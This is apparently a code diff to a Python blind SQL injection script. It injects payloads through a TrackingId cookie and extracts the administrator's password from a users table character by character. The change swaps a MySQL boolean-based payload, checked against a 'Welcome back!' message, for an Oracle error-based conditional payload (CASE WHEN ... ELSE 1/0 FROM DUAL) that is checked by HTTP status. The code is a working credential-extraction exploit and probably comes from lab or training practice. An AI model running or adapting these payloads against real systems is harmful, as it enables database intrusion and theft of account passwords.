@@ -16,16 +16,13 @@ class SQL(Base):
         self.session.cookies.set("TrackingId", f"{self.tracking_id}{content}")
     
     def _verify_true_query(self, response: Response):
-        soup = BeautifulSoup(response.text, "html.parser")
-        top_section = soup.find("section", class_="top-links")
-        welcome_back = top_section.find("div", string="Welcome back!")
-        if welcome_back:
-            return True 
+        if response.status_code == 200:
+            return True
         else:
             return False
     
     def _prepare_payload(self, ascii_value_to_compare_with, start_position):
-        base_payload = f"' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='administrator'),{start_position},1)) >= {ascii_value_to_compare_with} {SQLComments.MYSQL}"
+        base_payload = f"' OR (SELECT CASE WHEN (ASCII(SUBSTR((SELECT password from users where username='administrator'), {start_position}, 1)) >= {ascii_value_to_compare_with}) THEN 1 ELSE 1/0 END from DUAL)=1 {SQLComments.ORACLE}"
         return base_payload
     
     def _identify_character_at_position(self, start_position):
